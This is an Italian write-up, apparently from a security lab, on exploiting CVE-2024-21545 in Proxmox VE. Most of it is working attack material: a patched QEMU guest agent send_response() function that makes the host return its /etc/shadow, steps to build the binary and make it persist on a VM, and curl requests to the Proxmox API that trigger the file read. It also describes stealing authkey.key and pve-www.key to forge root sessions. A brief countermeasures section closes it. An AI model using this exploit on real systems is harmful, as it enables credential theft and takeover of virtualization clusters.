## Spiegazione Completa dell'Exploit CVE-2024-21545
https://labs.snyk.io/resources/proxmox-ve-cve-2024-21545-tricking-the-api/

### Setup e Versioni

Il nostro ambiente di test era composto da:

- **Host Proxmox**: Versione 8.1.3, che ospita le VM e gestisce l'infrastruttura di virtualizzazione
- **VM Target**: Macchina virtuale con QEMU Guest Agent versione 10.2.1, ottenuto dal repository ufficiale QEMU (git clone https://gitlab.com/qemu-project/qemu.git, checkout del tag v10.2.1)
- **Macchina Attaccante**: Sistema Linux (laptop dell'attaccante) utilizzato per inviare richieste malevole all'API di Proxmox
- **Pacchetti richiesti sulla macchina di compilazione**: build-essential, pkg-config, libglib2.0-dev, flex, bison, libpixman-1-dev, e le relative librerie di sviluppo per la compilazione di QEMU

### La Vulnerabilità

CVE-2024-21545 è una vulnerabilità di lettura arbitraria di file che affligge Proxmox VE. La radice del problema risiede nel modo in cui l'API di Proxmox gestisce le risposte dei comandi inviati al QEMU Guest Agent delle VM. La funzione `handle_api2_request` controlla se la risposta di un endpoint API contiene un oggetto `download`. Se presente, il server legge e invia al client il file specificato dal campo `path` di quell'oggetto, senza effettuare controlli sufficienti sull'origine della risposta o sul percorso richiesto.

Un attaccante con permessi `VM.Monitor` o `Sys.Audit` può sfruttare questa vulnerabilità per leggere file arbitrari dall'host Proxmox, inclusi file sensibili come `/etc/shadow` o le chiavi di autenticazione (`authkey.key` e `pve-www.key`), che permettono la forgery di sessioni root.

### Strategia dell'Attacco

L'attacco richiede due fasi principali:

1. **Compromissione del Guest Agent**: L'attaccante deve avere accesso root alla VM target per modificare il binario del QEMU Guest Agent. Questo è il presupposto fondamentale: l'attaccante deve già avere privilegi elevati sulla VM per patchare il guest agent.

2. **Patch del Guest Agent**: Il guest agent viene modificato per intercettare le risposte di errore e sostituirle con un oggetto `download` malevolo che punta a file arbitrari dell'host.

### Implementazione della Patch

La patch è stata applicata alla funzione `send_response()` nel file `qga/main.c` del codice sorgente di QEMU 10.2.1. Questa funzione è responsabile dell'invio delle risposte dal guest agent all'host Proxmox tramite l'API.

#### Versione Finale della Patch (Ultra-Semplice)

Dopo numerosi test, è emerso che la versione più robusta e affidabile della patch è quella che intercetta **tutti** gli errori, indipendentemente dal loro formato:

```c
static int send_response(GAState *s, const QDict *rsp)
{
    GString *response;
    GIOStatus status;

    g_assert(s->channel);

    if (!rsp) {
        return 0;
    }

    /* ===== PATCH ULTRA-SEMPLICE CVE-2024-21545 ===== */
    /* Se c'è un errore, restituisci /etc/shadow */
    if (qdict_haskey(rsp, "error")) {
        g_debug("[CVE-2024-21545] Intercepting error - returning /etc/shadow");
        response = g_string_new("{\"return\":{\"download\":{\"path\":\"/etc/shadow\",\"content-type\":\"text/plain\"}}}");
    } else {
        response = qobject_to_json(QOBJECT(rsp));
        if (!response) {
            return -EINVAL;
        }
    }
    /* ===== FINE PATCH ===== */

    if (s->delimit_response) {
        s->delimit_response = false;
        g_string_prepend_c(response, QGA_SENTINEL_BYTE);
    }

    g_string_append_c(response, '\n');
    status = ga_channel_write_all(s->channel, response->str, response->len);
    g_string_free(response, true);
    if (status != G_IO_STATUS_NORMAL) {
        return -EIO;
    }

    return 0;
}
```

Questa versione è particolarmente efficace perché:
1. Intercetta **qualsiasi** errore restituito dal guest agent
2. Non dipende da pattern specifici come `NOTFOUND` che potrebbero variare tra versioni diverse
3. Restituisce sempre `/etc/shadow` quando rileva un errore, rendendo l'attacco estremamente semplice da eseguire

### Compilazione e Installazione

La compilazione del guest agent patchato è stata eseguita con i seguenti comandi:

```bash
cd /home/test/qemu
git checkout v10.2.1
# Applicazione della patch ultra-semplice a qga/main.c
./configure --enable-guest-agent --enable-debug
make -j$(nproc) qemu-ga
```

Il binario compilato (`qga/qemu-ga`) è stato poi copiato nella VM target:

```bash
scp /home/test/qemu/build/qga/qemu-ga root@VM_IP:/usr/sbin/qemu-ga
```

Per garantire la persistenza della patch anche dopo riavvii, è stato necessario:
1. Creare un backup del binario originale (`/usr/sbin/qemu-ga.original`)
2. Sostituire permanentemente il binario originale con quello patchato
3. Verificare che il binario contenesse effettivamente la patch usando `strings /usr/sbin/qemu-ga | grep -i "CVE-2024"`

Il servizio è stato riavviato:

```bash
sudo systemctl stop qemu-guest-agent
sudo systemctl start qemu-guest-agent
```

### Esecuzione dell'Exploit

Una volta installato il guest agent patchato, l'attaccante può inviare una richiesta all'API di Proxmox. È importante notare che **i token di autenticazione di Proxmox cambiano ad ogni riavvio del servizio**, quindi è necessario autenticarsi nuovamente per ottenere token freschi:

```bash
# 1. Ottieni token freschi
curl -k -d "username=test@pve&password=12345678" \
  https://192.168.122.25:8006/api2/json/access/ticket

# 2. Usa i token per inviare il comando malevolo
curl -k -b "PVEAuthCookie=<TICKET>" \
  -H "CSRFPreventionToken: <CSRF_TOKEN>" \
  -X POST \
  https://192.168.122.25:8006/api2/json/nodes/pve/qemu/100/agent/exec \
  -d "command=NOTFOUND/etc/shadow"
```

**Nota**: Con la patch ultra-semplice, non è necessario usare `NOTFOUND`. Qualsiasi comando che genera un errore (come `xyz` o `comando_inesistente`) attiverà la patch e restituirà `/etc/shadow`.

### Analisi dei Log e Debug

Per verificare che la patch sia attiva, è possibile monitorare i log del guest agent:

```bash
sudo journalctl -u qemu-guest-agent -f
```

Quando la patch intercetta un errore, i log mostreranno:

```
Jun 25 09:40:00 test qemu-ga[1280]: info: guest-exec called: "NOTFOUND/etc/shadow"
Jun 25 09:40:00 test qemu-ga[1280]: DEBUG: [CVE-2024-21545] Intercepting error - returning /etc/shadow
```

Se i messaggi di debug non compaiono, significa che il binario patchato non è in esecuzione e il guest agent sta usando il binario originale.

### Risultato dell'Attacco

La risposta dell'API contiene il file `/etc/shadow` **dell'host Proxmox**, non della VM. Questo dimostra che:

1. Il guest agent patchato ha intercettato la risposta di errore
2. Ha sostituito l'errore con un oggetto `download` che punta a `/etc/shadow`
3. L'API di Proxmox ha elaborato l'oggetto `download` e ha letto il file dal filesystem dell'host
4. Il contenuto del file è stato restituito all'attaccante

### Impatto e Implicazioni per la Sicurezza

Questa vulnerabilità ha un impatto critico perché permette a un attaccante con accesso limitato (permesso `VM.Monitor` su una VM e accesso root alla VM stessa) di leggere file arbitrari dall'host Proxmox. Questo può portare a:

- **Lettura di `/etc/shadow`**: Permette di ottenere gli hash delle password degli utenti dell'host
- **Furto di chiavi di autenticazione**: I file `/etc/pve/priv/authkey.key` e `/etc/pve/pve-www.key` possono essere rubati
- **Forgery di sessioni**: Con le chiavi rubate, l'attaccante può forgiare ticket di autenticazione validi per `root@pam`, come documentato nella ricerca originale di Snyk
- **Compromesso totale del cluster**: Con accesso root a un nodo Proxmox, l'attaccante può compromettere l'intero cluster

### Lezioni Apprese

Durante l'implementazione dell'exploit, sono emerse diverse considerazioni importanti:

1. **La persistenza della patch è fondamentale**: Dopo un riavvio del nodo Proxmox o della VM, il binario patchato può essere sovrascritto o ripristinato. È necessario garantire che il binario patchato sia installato in modo permanente.

2. **I token di autenticazione sono volatili**: I token CSRF e i ticket di autenticazione di Proxmox cambiano ad ogni riavvio del servizio. Qualsiasi strumento di automazione deve gestire l'autenticazione dinamica.

3. **Il debug è essenziale**: L'abilitazione dei messaggi di debug (`--verbose` e `g_debug`) è fondamentale per verificare che la patch sia effettivamente attiva e funzionante.

4. **La semplicità è affidabile**: La versione ultra-semplice della patch (che intercetta tutti gli errori) si è dimostrata più robusta rispetto a versioni che cercano pattern specifici, perché non dipende dal formato del messaggio di errore che può variare tra versioni diverse.

### Contromisure

Per difendersi da questa vulnerabilità, è possibile implementare:

1. **AppArmor**: Configurato per limitare l'accesso ai file sensibili dell'host
2. **SELinux**: Basato su etichette di sicurezza, fornisce una protezione più robusta contro questo tipo di attacchi
3. **Principio del minimo privilegio**: Limitare i permessi `VM.Monitor` e `Sys.Audit` solo agli utenti che ne hanno realmente bisogno
4. **Aggiornamenti di sicurezza**: Applicare le patch di Proxmox che mitigano questa vulnerabilità
5. **Monitoraggio dei log**: Controllare regolarmente i log del guest agent per rilevare tentativi di sfruttamento

### Il Ruolo di AppArmor e SELinux

La vulnerabilità CVE-2024-21545 evidenzia l'importanza dei sistemi di controllo degli accessi:

- **AppArmor**: Essendo basato su percorsi, può bloccare l'accesso a file specifici ma è vulnerabile a elusioni se l'attaccante ottiene privilegi elevati
- **SELinux**: Essendo basato su etichette di sicurezza, fornisce una protezione più robusta perché le decisioni di accesso non dipendono dal percorso del file ma dal suo contesto di sicurezza

Questo caso di studio dimostra come un'attenta configurazione di AppArmor e SELinux possa prevenire o mitigare attacchi di lettura arbitraria di file in ambienti containerizzati e virtualizzati, anche quando l'attaccante ha già compromesso una VM all'interno del sistema.